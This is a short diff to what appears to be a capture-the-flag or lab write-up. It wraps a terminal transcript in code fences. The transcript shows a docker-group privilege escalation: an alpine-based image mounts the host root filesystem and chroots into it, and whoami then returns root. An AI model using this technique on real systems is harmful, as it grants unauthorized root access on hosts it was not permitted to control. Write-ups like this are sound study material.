@@ -277,8 +277,10 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 ```
 I will choose the `oven/bun:1-alpine` and attempt to escalate to root.
 
+```term
 ??┌─[echoes@TaskFlow]──[/tmp]
 ??└─▶ docker run -v /:/mnt --rm -it oven/bun:1-alpine chroot /mnt /bin/bash
 ??[root@5aade71d0c1c /]# whoami
 !!root
 [root@5aade71d0c1c /]#
+```
